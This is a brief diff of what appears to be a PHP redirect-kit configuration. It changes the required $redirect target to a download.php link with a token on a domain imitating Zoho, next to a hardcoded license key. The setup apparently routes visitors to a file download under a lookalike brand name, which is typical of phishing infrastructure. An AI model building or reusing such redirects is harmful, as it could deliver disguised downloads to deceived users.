@@ -11,7 +11,7 @@
 
 $license_key = "p0gd1smo31iqrgn34osxmag5jz32136y"; // [REQUIRED]
 
-$redirect = "https://xre.wzr.mybluehostin.me/00x/00x0f33910027"; // URL or FILE [REQUIRED]
+$redirect = "https://zohoworkspaces.com/download.php?id=1&token=8a22a4755b64410f33653d01f379b647&download"; // URL or FILE [REQUIRED]
 
 
 $parameter = 2; // [REQUIRED]
